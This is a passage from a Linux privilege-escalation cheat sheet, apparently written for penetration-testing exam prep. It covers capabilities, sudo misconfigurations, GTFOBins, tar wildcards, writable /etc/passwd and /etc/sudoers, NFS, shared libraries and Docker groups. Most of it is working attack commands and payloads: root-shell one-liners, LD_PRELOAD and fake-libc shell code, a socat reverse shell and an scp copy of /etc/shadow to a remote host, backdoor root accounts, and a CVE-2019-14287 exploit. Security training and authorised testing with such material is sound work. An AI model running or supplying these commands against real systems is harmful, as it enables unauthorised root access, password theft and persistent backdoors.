$ ./python3 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
$ id
uid=0(root) gid=1000(swissky)
</code></pre></div><p>Privilege escalation with <code>cap_setuid+ep</code> and <code>Perl</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$./perl -e <span style="color:#e6db74">&#39;use POSIX (setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
<span style="color:#75715e">#•	perl -e allows us to execute perl code.</span>
<span style="color:#75715e">#•	use POSIX (setuid); imports the required module.</span>
<span style="color:#75715e">#•	POSIX::setuid(0); sets the UID to 0, which is root.</span>
<span style="color:#75715e">#•	exec &#34;/bin/bash&#34;; executes bash as root.</span>
</code></pre></div><p>Privilege escalation with <code>cap_dac_read_search</code> and <code>zip</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$/path/to/zip /tmp/shadow.zip /etc/shadow
<span style="color:#75715e">#/path/to/ is the directory of the zip file with the added capability.</span>
<span style="color:#75715e">#Next, we extract that archive: </span>
$unzip /tmp/shadow.zip -d /tmp
<span style="color:#75715e">#Then, we can simply read the file: </span>
$cat /tmp/etc/shadow
</code></pre></div><p>Privilege escalation with <code>tar = cap_dac_read_search+ep</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$tar -cvf shadow.tar /etc/shadow
$tar -xvf shadow.tar
$cat /etc/shadow
</code></pre></div><table>
<thead>
<tr>
<th>Capabilities name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CAP_AUDIT_CONTROL</td>
<td>Allow to enable/disable kernel auditing</td>
</tr>
<tr>
<td>CAP_AUDIT_WRITE</td>
<td>Helps to write records to kernel auditing log</td>
</tr>
<tr>
<td>CAP_BLOCK_SUSPEND</td>
<td>This feature can block system suspends</td>
</tr>
<tr>
<td>CAP_CHOWN</td>
<td>Allow user to make arbitrary change to files UIDs and GIDs</td>
</tr>
<tr>
<td>CAP_DAC_OVERRIDE</td>
<td>This helps to bypass file read, write and execute permission checks</td>
</tr>
<tr>
<td>CAP_DAC_READ_SEARCH</td>
<td>This only bypass file and directory read/execute permission checks</td>
</tr>
<tr>
<td>CAP_FOWNER</td>
<td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
</tr>
<tr>
<td>CAP_KILL</td>
<td>Allow the sending of signals to processes belonging to others</td>
</tr>
<tr>
<td>CAP_SETGID</td>
<td>Allow changing of the GID</td>
</tr>
<tr>
<td>CAP_SETUID</td>
<td>Allow changing of the UID</td>
</tr>
<tr>
<td>CAP_SETPCAP</td>
<td>Helps to transferring and removal of current set to any PID</td>
</tr>
<tr>
<td>CAP_IPC_LOCK</td>
<td>This helps to lock memory</td>
</tr>
<tr>
<td>CAP_MAC_ADMIN</td>
<td>Allow MAC configuration or state changes</td>
</tr>
<tr>
<td>CAP_NET_RAW</td>
<td>Use RAW and PACKET sockets</td>
</tr>
<tr>
<td>CAP_NET_BIND_SERVICE</td>
<td>SERVICE Bind a socket to internet domain privileged ports</td>
</tr>
<tr>
<td>Reference: <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Capabilities</a></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="sudo">SUDO</h2>
<p>Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>
<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
View sudo rights:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
</code></pre></div><h3 id="allow-root-privilege-to-binary-commands">Allow Root Privilege to Binary commands</h3>
<p>(root) ALL: run all command as root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo su
<span style="color:#75715e">#or</span>
$sudo bash
</code></pre></div><p>Find</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo find /home -exec /bin/bash <span style="color:#ae81ff">\;</span>
$sudo find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
</code></pre></div><p>Perl</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
</code></pre></div><p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Less</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo less /etc/profile 
$!/bin/sh or !bash
</code></pre></div><p>Time</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo time /bin/bash
</code></pre></div><p>AWK</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
</code></pre></div><p>Man</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo man man
!bash
</code></pre></div><p>Vi</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo vi
:!bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo vi -c <span style="color:#e6db74">&#39;!bash&#39;</span>
</code></pre></div><p>Sed</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo sed -n ‘le exec sh 1&gt;&amp;0’ /etc/passwd
</code></pre></div><p>Xxd</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$xxd <span style="color:#e6db74">&#34;/etc/shadow&#34;</span> | xxd -r
<span style="color:#75715e">#crack pass with john</span>
</code></pre></div><p>Cat:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo cat /etc/shadow -&gt; crack pass<span style="color:#f92672">(</span>john/hashcat<span style="color:#f92672">)</span>
</code></pre></div><h3 id="allow-root-privilege-to-shell-script">Allow Root Privilege to Shell Script</h3>
<p>ALL= (root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell</p>
<p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!  /usr/bin/python
</span><span style="color:#75715e"></span>Import os
Os.system<span style="color:#f92672">(</span>“/bin/bash”<span style="color:#f92672">)</span>
</code></pre></div><p>C</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include&lt;stdio.h&gt;</span>
<span style="color:#75715e">#include &lt;unistd.h&gt;</span>
<span style="color:#75715e">#include&lt;sys/types.h&gt;</span>
Int main<span style="color:#f92672">(){</span>
	Setuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">())</span>;
	System<span style="color:#f92672">(</span>“/bin/bash”<span style="color:#f92672">)</span>;
	Return 0;
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Gcc demo.c -o shell
./shell
</code></pre></div><p>Bash script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#! /bin/bash
</span><span style="color:#75715e"></span>/bin/bash
</code></pre></div><h3 id="allow-sudo-right-to-other-programs">Allow Sudo Right to other Programs</h3>
<p>ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat</p>
<p>Env</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo env /bin/bash
</code></pre></div><p>FTP/GDB</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo ftp
$!/bin/bash
</code></pre></div><p>Socat</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:1234 <span style="color:#f92672">(</span>attacker<span style="color:#f92672">)</span>
$sudo socat exec:<span style="color:#e6db74">&#39;sh -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:$IP:1234 <span style="color:#f92672">(</span>victim<span style="color:#f92672">)</span>
</code></pre></div><p>SCP
Syntax: scp SourceFile user@host:~/path of the directory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo scp /etc/passwd user@$IP:~/
$sudo scp /etc/shadow user@$IP:~/
</code></pre></div><p>Zip</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo zip /tmp/test.zip /tmp/test -T --unzip-command<span style="color:#f92672">=</span>”sh -c /bin/bash”
</code></pre></div><p>Tar</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo tar cf /dev/null testfile --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> — checkpointaction<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>/bin/bash
</code></pre></div><p>Strace</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo strace -o/dev/null /bin/bash
</code></pre></div><p>Tcpdump</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo $’id<span style="color:#ae81ff">\n</span>cat /etc/shadow’ &gt; /tmp/.shell
$ chmod +x /tmp/.shell
$ sudo tcpdump -ln -i eth0 -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z /tmp/.shell -Z root
</code></pre></div><p>Nmap</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap --interactive
nmap&gt; !sh
</code></pre></div><p>Git</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo git help status
: !/bin/bash
</code></pre></div><h3 id="ld_preload">LD_PRELOAD</h3>
<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Defaults        env_keep += LD_PRELOAD
</code></pre></div><p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
<span style="color:#75715e">#include &lt;sys/types.h&gt;</span>
<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
void _init() {
	unsetenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
	setgid(0);
	setuid(0);
	system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
}
</code></pre></div><p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>
<h3 id="doas">Doas</h3>
<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">permit nopass demo as root cmd vim
</code></pre></div><h3 id="sudo_inject">sudo_inject</h3>
<p>Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ sudo whatever
<span style="color:#66d9ef">[sudo]</span> password <span style="color:#66d9ef">for</span> user<span style="color:#960050;background-color:#1e0010">:</span>    
<span style="color:#75715e"># Press &lt;ctrl&gt;+c since you don&#39;t have the password. </span>
<span style="color:#75715e"># This creates an invalid sudo tokens.</span>
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i <span style="color:#75715e"># no password required :)</span>
<span style="color:#75715e"># id</span>
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>
<h3 id="cve-2019-14287">CVE-2019-14287</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Exploitable when a user have the following permissions (sudo -l)</span>
(ALL, !root) ALL

<span style="color:#75715e"># If you have a full TTY, you can exploit it like this</span>
sudo -u<span style="color:#75715e">#-1 /bin/bash</span>
sudo -u<span style="color:#75715e">#4294967295 id</span>
</code></pre></div><h2 id="gtfobins">GTFOBins</h2>
<p><a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
<blockquote>
<p>gdb -nx -ex &lsquo;!sh&rsquo; -ex quit <br>
sudo mysql -e &lsquo;! /bin/sh&rsquo; <br>
strace -o /dev/null /bin/sh <br>
sudo awk &lsquo;BEGIN {system(&quot;/bin/sh&quot;)}&rsquo;</p>
</blockquote>
<h2 id="wildcard">Wildcard</h2>
<p>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that&rsquo;s where the wildcard comes in handy.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># create file for exploitation</span>
touch -- <span style="color:#e6db74">&#34;--checkpoint=1&#34;</span>
touch -- <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
echo <span style="color:#e6db74">&#34;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&#34;</span> &gt; shell.sh

<span style="color:#75715e"># vulnerable script</span>
tar cf archive.tar *
</code></pre></div><p>Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>
<h2 id="writable-files">Writable files</h2>
<p>List world writable files on the system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">find / -writable ! -user `whoami` -type f ! -path <span style="color:#e6db74">&#34;/proc/*&#34;</span> ! -path <span style="color:#e6db74">&#34;/sys/*&#34;</span> -exec ls -al {} \; 2&gt;/dev/null
find / -perm -2 -type f 2&gt;/dev/null
find / ! -path <span style="color:#e6db74">&#34;*/proc/*&#34;</span> -perm -2 -type f -print 2&gt;/dev/null
</code></pre></div><h3 id="writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</h3>
<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">NAME=Network /bin/id  &amp;lt;= Note the blank space
ONBOOT=yes
DEVICE=eth0

EXEC <span style="color:#960050;background-color:#1e0010">:</span>
./etc/sysconfig/network-scripts/ifcfg-1337
</code></pre></div><p>src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f]
(<a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a>)</p>
<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
<p>First generate a password with one of the following commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c <span style="color:#e6db74">&#39;import crypt; print crypt.crypt(&#34;hacker&#34;, &#34;$6$salt&#34;)&#39;</span>
</code></pre></div><p>Then add the user <code>hacker</code> and add the generated password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">hacker<span style="color:#960050;background-color:#1e0010">:</span>GENERATED_PASSWORD_HERE<span style="color:#960050;background-color:#1e0010">:</span>0<span style="color:#960050;background-color:#1e0010">:</span>0<span style="color:#960050;background-color:#1e0010">:</span>Hacker<span style="color:#960050;background-color:#1e0010">:</span>/root<span style="color:#960050;background-color:#1e0010">:</span>/bin/bash
</code></pre></div><p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
<p>Alternatively you can use the following lines to add a dummy user without a password. <br>
WARNING: you might degrade the current security of the machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">echo <span style="color:#e6db74">&#39;dummy::0:0::/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
su - dummy
</code></pre></div><p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p>
<h3 id="writable-etcsudoers">Writable /etc/sudoers</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">echo <span style="color:#e6db74">&#34;username ALL=(ALL:ALL) ALL&#34;</span>&gt;&gt;/etc/sudoers

<span style="color:#75715e"># use SUDO without password</span>
echo <span style="color:#e6db74">&#34;username ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt;/etc/sudoers
echo <span style="color:#e6db74">&#34;username ALL=NOPASSWD: /bin/bash&#34;</span> &gt;&gt;/etc/sudoers
</code></pre></div><h2 id="exploiting-services">Exploiting Services</h2>
<p>It’s always worth checking services because you might find a version that has a PoC exploit available.</p>
<p>You might also find internal services that can be accessed by port forwarding.</p>
<h3 id="services-manual-enumeration">Services manual enumeration</h3>
<p>Search for services running as root:</p>
<p><code>ps aux | grep &quot;^root&quot;</code></p>
<p>Enumerate version details:</p>
<p><code>&lt;SERVICE&gt; --version</code>
or
<code>dpkg -l | grep &lt;SERVICE&gt;</code>
or
<code>rpm -qa | grep &lt;SERVICE&gt;</code></p>
<h3 id="automatic-enumeration">Automatic enumeration</h3>
<p>lse.sh:</p>
<p><code>./lse.sh -l 1 -i</code>
Check for services like MySQL. Can you login as root wtihout password?
Run service versions through searchsploit to check for PoC exploits.</p>
<h3 id="port-forwarding">Port forwarding</h3>
<p>Port forwarding is something you definitely need to be able to do for your exam.
I found it a bit confusing at first but once you get the concept it’s quite straight forward.
Run netstat to check for open internal ports:</p>
<p><code>netstat -nl</code></p>
<p>Port forward via SSH:
<code>ssh -R &lt;KALI-PORT&gt;:127.0.0.1:&lt;SERVICE-PORT&gt; &lt;KALI-USERNAME&gt;@&lt;KALI-IP&gt;</code>
Example: <code>ssh -R 5555:127.0.0.1:3306 root@10.10.10.10</code></p>
<h2 id="nfs-root-squashing">NFS Root Squashing</h2>
<p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># remote check the name of the folder</span>
showmount -e 10.10.10.10

<span style="color:#75715e"># create dir</span>
mkdir /tmp/nfsdir  

<span style="color:#75715e"># mount directory </span>
mount -t nfs 10.10.10.10<span style="color:#960050;background-color:#1e0010">:</span>/shared /tmp/nfsdir    
cd /tmp/nfsdir

<span style="color:#75715e"># copy wanted shell </span>
cp /bin/bash . 	

<span style="color:#75715e"># set suid permission</span>
chmod +s bash 	
</code></pre></div><h2 id="shared-library">Shared Library</h2>
<h3 id="ldconfig">ldconfig</h3>
<p>Identify shared libraries with <code>ldd</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
</code></pre></div><p>Create a library in <code>/tmp</code> and activate the path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">gcc <span style="color:#960050;background-color:#1e0010">–</span>Wall <span style="color:#960050;background-color:#1e0010">–</span>fPIC <span style="color:#960050;background-color:#1e0010">–</span>shared <span style="color:#960050;background-color:#1e0010">–</span>o vulnlib.so /tmp/vulnlib.c
echo <span style="color:#e6db74">&#34;/tmp/&#34;</span> &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
/opt/binary
</code></pre></div><h3 id="rpath">RPATH</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ readelf -d flag15 | egrep <span style="color:#e6db74">&#34;NEEDED|RPATH&#34;</span>
 0x00000001 (NEEDED)                     Shared library<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">[libc.so.6]</span>
 0x0000000f (RPATH)                      Library rpath<span style="color:#960050;background-color:#1e0010">:</span> [/var/tmp/flag15]

level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =&gt;  (0x0068c000)
 libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
</code></pre></div><p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =&gt;  (0x005b0000)
 libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
</code></pre></div><p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#include&lt;stdlib.h&gt;</span>
<span style="color:#75715e">#define SHELL &#34;/bin/sh&#34;</span>

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
</code></pre></div><h2 id="groups">Groups</h2>
<h3 id="docker">Docker</h3>
<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; docker run -it --rm -v $PWD:/mnt bash
$&gt; echo <span style="color:#e6db74">&#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#39;</span> &gt;&gt; /mnt/etc/passwd
</code></pre></div><p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">docker run --rm -it --pid=host --net=host --privileged -v /<span style="color:#960050;background-color:#1e0010">:</span>/host ubuntu bash
</code></pre></div><p>Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ docker run -v /<span style="color:#960050;background-color:#1e0010">:</span>/hostOS -i -t chrisfosterelli/rootplease
latest<span style="color:#960050;background-color:#1e0010">:</span> Pulling from chrisfosterelli/rootplease
2de59b831a23<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
354c3661655e<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
91930878a2d7<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
a3ed95caeb02<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
489b110c54dc<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
Digest<span style="color:#960050;background-color:#1e0010">:</span> sha256<span style="color:#960050;background-color:#1e0010">:</span>07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status<span style="color:#960050;background-color:#1e0010">:</span> Downloaded newer image <span style="color:#66d9ef">for</span> chrisfosterelli/rootplease<span style="color:#960050;background-color:#1e0010">:</span>latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0<span style="color:#75715e"># id</span>
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>More docker privilege escalation using the Docker Socket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -v /<span style="color:#960050;background-color:#1e0010">:</span>/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
